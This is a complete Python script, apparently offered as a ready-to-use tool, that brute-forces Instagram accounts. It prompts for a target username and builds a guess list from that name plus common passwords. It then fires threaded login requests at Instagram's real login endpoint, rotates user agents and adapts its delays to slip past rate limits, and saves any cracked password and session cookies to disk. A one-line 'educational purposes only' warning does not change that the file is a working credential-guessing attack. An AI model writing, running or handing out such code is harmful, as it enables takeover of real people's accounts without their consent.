#!/usr/bin/env python3
"""
Simple Instagram Brute Force Tool - No Complex Dependencies
"""

import os
import sys
import time
import random
import requests
import json
from datetime import datetime
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SimpleInstagramBruteForcer:
    """Simple Instagram Brute Force Attack Class"""

    def __init__(self, target_username, password_list):
        self.target_username = target_username
        self.password_list = password_list
        self.found_password = None
        self.rate_limit_count = 0
        self.success_count = 0
        self.failed_count = 0
        self.checkpoint_count = 0

        # Simple session management
        self.session = requests.Session()
        self.session.verify = False

        # Basic user agents
        self.web_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/118.0',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
        ]

        self.adaptive_delay = 1.0

    def get_headers(self):
        """Generate basic headers"""
        return {
            'User-Agent': random.choice(self.web_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }

    def get_csrf_token(self):
        """Get CSRF token from Instagram login page"""
        try:
            headers = self.get_headers()
            response = self.session.get(
                'https://www.instagram.com/accounts/login/',
                headers=headers,
                timeout=15
            )

            if response.status_code == 200:
                # Try to extract CSRF token from response
                text = response.text
                if '"csrf_token":"' in text:
                    token = text.split('"csrf_token":"')[1].split('"')[0]
                    return token

                # Try to get from cookies
                csrf_cookie = self.session.cookies.get('csrftoken')
                if csrf_cookie:
                    return csrf_cookie

        except Exception as e:
            print(f"⚠️  CSRF token error: {e}")
        return None

    def attempt_login(self, password):
        """Simple login attempt"""
        try:
            # Add delay
            time.sleep(random.uniform(1, 3) + self.adaptive_delay)

            # Get CSRF token
            csrf_token = self.get_csrf_token()
            if not csrf_token:
                print(f"⚠️  No CSRF token for {password}")
                return False

            # Prepare headers
            headers = self.get_headers()
            headers.update({
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': 'https://www.instagram.com/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded'
            })

            # Login data
            login_data = {
                'username': self.target_username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }

            # Make login request
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=20
            )

            return self.analyze_response(response, password)

        except Exception as e:
            print(f"💥 Error with {password}: {e}")
            return False

    def analyze_response(self, response, password):
        """Analyze login response"""
        status_code = response.status_code
        text = response.text.lower()

        # Success indicators
        if any(indicator in text for indicator in ['authenticated', '"status":"ok"', 'logged_in_user', 'sessionid']):
            print(f"🎯 SUCCESS! Password: {password}")
            self.save_success(password, response)
            return True

        # Rate limit indicators
        if status_code == 429 or any(indicator in text for indicator in ['rate_limited', 'please wait', 'too many requests']):
            print(f"⏳ Rate limited for: {password}")
            self.adaptive_delay = min(self.adaptive_delay * 1.5, 10.0)
            self.rate_limit_count += 1
            return None

        # Checkpoint indicators
        if any(indicator in text for indicator in ['checkpoint_required', 'challenge_required', 'two_factor_required']):
            print(f"🔒 Checkpoint for: {password}")
            self.checkpoint_count += 1
            return False

        # Regular failure
        print(f"❌ Failed: {password}")
        self.failed_count += 1
        return False

    def save_success(self, password, response):
        """Save successful login details"""
        success_data = {
            'username': self.target_username,
            'password': password,
            'timestamp': datetime.now().isoformat(),
            'cookies': dict(response.cookies)
        }

        os.makedirs('logs', exist_ok=True)
        with open(f'logs/simple_success_{self.target_username}.json', 'w') as f:
            json.dump(success_data, f, indent=2)

    def brute_force_attack(self, max_threads=5):
        """Simple brute force attack"""
        print(f"💀 SIMPLE INSTAGRAM BRUTE FORCE")
        print(f"🎯 Target: {self.target_username}")
        print(f"🔢 Passwords: {len(self.password_list):,}")
        print(f"🧵 Threads: {max_threads}")
        print("=" * 50)

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []

            for password in self.password_list:
                if self.found_password:
                    print(f"\n🎉 PASSWORD FOUND - TERMINATING!")
                    break

                future = executor.submit(self.attempt_login, password)
                futures.append((future, password))

                # Progress reporting
                if len(futures) % 20 == 0:
                    elapsed = time.time() - start_time
                    rate = len(futures) / elapsed if elapsed > 0 else 0
                    print(
                        f"\n📊 Progress: {len(futures)}/{len(self.password_list)} | Speed: {rate:.1f}/sec")

            # Wait for all futures
            for future, password in futures:
                if self.found_password:
                    break
                try:
                    result = future.result(timeout=30)
                    if result is True:
                        self.found_password = password
                        self.success_count += 1
                        break
                except Exception as e:
                    print(f"⚠️  Future error for {password}: {e}")

        self.print_final_results(start_time)
        return self.found_password is not None

    def print_final_results(self, start_time):
        """Print final results"""
        elapsed = time.time() - start_time
        total_attempts = self.success_count + self.failed_count + self.checkpoint_count

        print(f"\n💀 SIMPLE ATTACK COMPLETED!")
        print(f"⏱️  Total Time: {elapsed/60:.1f} minutes")
        print(f"🎯 Total Attempts: {total_attempts:,}")
        print(f"✅ Success: {self.success_count}")
        print(f"❌ Failed: {self.failed_count}")
        print(f"🔒 Checkpoints: {self.checkpoint_count}")
        print(f"⏳ Rate Limits: {self.rate_limit_count}")

        if self.found_password:
            print(f"\n🎉 PWNED! Password: {self.found_password}")
            print(
                f"📁 Details saved in: logs/simple_success_{self.target_username}.json")
        else:
            print(f"\n💔 Target survived the simple assault")


def generate_password_list(username):
    """Generate password list based on username"""
    passwords = set()

    # Basic variations
    variations = [username, username.upper(), username.lower(),
                  username.capitalize()]

    # Common additions
    additions = ['123', '1234', '12345', '123456',
                 '1', '2024', '2025', '!', '@', '#']

    # Generate combinations
    for var in variations:
        passwords.add(var)
        for add in additions:
            passwords.add(var + add)
            passwords.add(add + var)

    # Common passwords
    common = ['password', 'password123',
              '123456', 'qwerty', 'admin', 'letmein']
    passwords.update(common)

    return list(passwords)


def main():
    """Main function"""
    print("💀 SIMPLE INSTAGRAM BRUTE FORCE TOOL")
    print("⚠️  WARNING: Educational purposes only!")
    print("=" * 50)

    target_username = input("🎯 Enter target username: ").strip()
    if not target_username:
        print("❌ Username is required!")
        return

    print(f"\n📋 Generating password list for {target_username}...")
    passwords = generate_password_list(target_username)
    print(f"📋 Generated {len(passwords)} passwords")

    max_threads = int(input(f"\n🧵 Max threads (default=3): ").strip() or "3")

    print(f"\n🚀 Starting simple attack...")
    input("Press ENTER to start... ")

    # Create brute forcer
    brute_forcer = SimpleInstagramBruteForcer(target_username, passwords)

    # Start attack
    try:
        success = brute_forcer.brute_force_attack(max_threads=max_threads)

        if success:
            print(f"\n🎉 MISSION ACCOMPLISHED!")
        else:
            print(f"\n😤 Target survived this round...")

    except KeyboardInterrupt:
        print(f"\n⚠️  Attack interrupted.")
    except Exception as e:
        print(f"💥 Unexpected error: {e}")


if __name__ == "__main__":
    main()
